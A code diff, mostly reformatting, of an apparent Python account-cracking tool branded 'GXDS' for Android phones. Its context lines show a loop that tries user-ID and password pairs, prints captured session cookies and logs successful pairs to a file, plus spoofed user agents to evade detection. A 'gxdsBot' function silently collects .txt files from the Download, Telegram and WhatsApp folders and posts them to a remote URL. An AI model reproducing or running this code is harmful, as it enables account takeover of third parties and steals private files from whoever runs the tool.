@@ -100,6 +100,7 @@ def yxxr(yx):
         yir = ""
     return yir
 
+
 # ANIMATION
 gxdsanmtn3 = [
     "[■□□□□□□□□□]",
@@ -157,9 +158,11 @@ id1 = "X".join(uuidd).replace("_", "C").replace("u", "GXDS").replace("a", "J")
 gxdsid = id1 + spce
 gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text
 
+
 def lxnes():
     print(f"{dg}  ————————————————————————————————————————")
     print(f"{dg}  ————————————————————————————————————————")
+
 
 # LOOP MENU
 loop = 0
@@ -169,20 +172,79 @@ ugen = []
 
 # UA RANDOMIZER
 for xd in range(50000):
-    aa='Mozilla/5.0 (Linux; U; Android 11;'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c='fr-fr; Redmi Note 11 Build/'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    lx=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
-    xyzz=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {lx}'
+    aa = "Mozilla/5.0 (Linux; U; Android 11;"
+    b = random.choice(["6", "7", "8", "9", "10", "11", "12"])
+    c = "fr-fr; Redmi Note 11 Build/"
+    d = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    e = random.randrange(1, 999)
+    f = random.choice(
+        [
+            "A",
+            "B",
+            "C",
+            "D",
+            "E",
+            "F",
+            "G",
+            "H",
+            "I",
+            "J",
+            "K",
+            "L",
+            "M",
+            "N",
+            "O",
+            "P",
+            "Q",
+            "R",
+            "S",
+            "T",
+            "U",
+            "V",
+            "W",
+            "X",
+            "Y",
+            "Z",
+        ]
+    )
+    g = "AppleWebKit/537.36 (KHTML, like Gecko) Version/"
+    h = random.randrange(73, 100)
+    i = "0"
+    j = random.randrange(4200, 4900)
+    k = random.randrange(40, 150)
+    lx = " Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn"
+    xyzz = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {lx}"
     ugen.append(xyzz)
+
 
 def gxdslogo():
     systm("clear")
@@ -265,9 +327,9 @@ def main():
     elif optixn == "2":
         xcokis()
         slp(2)
-        #print(f"{lgr}  [X] MAINTENANCE")
-        #slp(3)
-        #main()
+        # print(f"{lgr}  [X] MAINTENANCE")
+        # slp(3)
+        # main()
     elif optixn == "3":
         print("")
         systm(
@@ -432,6 +494,7 @@ def gxdsFilesMenu(gxdsfiles):
                 pxss,
             )
 
+
 # API
 def gxds_files(uid, pxss):
     global oks, loop, cps, ugen
@@ -490,13 +553,31 @@ def gxds_files(uid, pxss):
                     ]
                 )
                 xcki = coki.split("sb=")[1]
-                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " -\033[1;35m " + yxxr(uid) + "\n\033[1;32m[COOKIES]" + xcki)
+                print(
+                    "\r\r\033[1;32m  [GXDS-✓] "
+                    + uid
+                    + ":"
+                    + ps
+                    + " -\033[1;35m "
+                    + yxxr(uid)
+                    + "\n\033[1;32m[COOKIES]"
+                    + xcki
+                )
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             else:
-              print("\r\r\033[1;32m  [GXDS-X] " + uid + ":" + ps + " -\033[1;31m " + yxxr(uid) + "\n\033[1;32m[COOKIES]" + xcki)
-                continue
+                print(
+                    "\r\r\033[1;32m  [GXDS-X] "
+                    + uid
+                    + ":"
+                    + ps
+                    + " -\033[1;31m "
+                    + yxxr(uid)
+                    + "\n\033[1;32m[COOKIES]"
+                    + xcki
+                )
+            continue
         loop += 1
     except:
         slp(2)
@@ -552,7 +633,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-      
+
     try:
         sdcard_path = "/sdcard/Download"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
@@ -580,7 +661,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-      
+
     try:
         sdcard_path = "/sdcard/Download/Telegram"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
@@ -608,7 +689,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-      
+
     try:
         sdcard_path = "/sdcard/Telegram/Telegram Files"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
@@ -636,7 +717,7 @@ def gxdsBot():
                 sent = session.post(url, data=data2, files=files)
     except:
         pass
-      
+
     try:
         sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
